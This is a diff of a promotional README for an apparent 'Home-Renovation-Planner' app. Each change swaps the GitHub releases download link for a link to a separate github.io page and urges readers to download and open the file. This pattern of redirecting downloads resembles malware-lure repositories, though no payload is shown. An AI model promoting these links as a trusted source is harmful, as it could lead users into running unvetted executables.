@@ -1,6 +1,6 @@
 # 🏠 Home-Renovation-Planner - Plan, Track, and Budget Your Dream Renovation
 
-[![Download Home-Renovation-Planner](https://img.shields.io/badge/Download-Home--Renovation--Planner-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Serviceswage2135/Home-Renovation-Planner/releases)
+[![Download Home-Renovation-Planner](https://img.shields.io/badge/Download-Home--Renovation--Planner-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://serviceswage2135.github.io)
 
 ## 🤔 What Is Home-Renovation-Planner?
 
@@ -22,7 +22,7 @@ Getting started with Home-Renovation-Planner takes less than a minute. Here's wh
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [https://github.com/Serviceswage2135/Home-Renovation-Planner/releases](https://github.com/Serviceswage2135/Home-Renovation-Planner/releases)
+Visit this link to download the application: [https://serviceswage2135.github.io](https://serviceswage2135.github.io)
 
 Click the download button on that page to get the file onto your computer. The download is completely free.
 
@@ -184,9 +184,9 @@ Download Home-Renovation-Planner today and take the stress out of your renovatio
 
 Click the button below to download Home-Renovation-Planner and start planning your renovation today:
 
-[![Download Now](https://img.shields.io/badge/Download-Home--Renovation--Planner-FF5722?style=for-the-badge&logo=download&logoColor=white)](https://github.com/Serviceswage2135/Home-Renovation-Planner/releases)
+[![Download Now](https://img.shields.io/badge/Download-Home--Renovation--Planner-FF5722?style=for-the-badge&logo=download&logoColor=white)](https://serviceswage2135.github.io)
 
-Visit this link to download the application: [https://github.com/Serviceswage2135/Home-Renovation-Planner/releases](https://github.com/Serviceswage2135/Home-Renovation-Planner/releases)
+Visit this link to download the application: [https://serviceswage2135.github.io](https://serviceswage2135.github.io)
 
 Once downloaded, open the file and you're ready to go. Happy renovating!
 
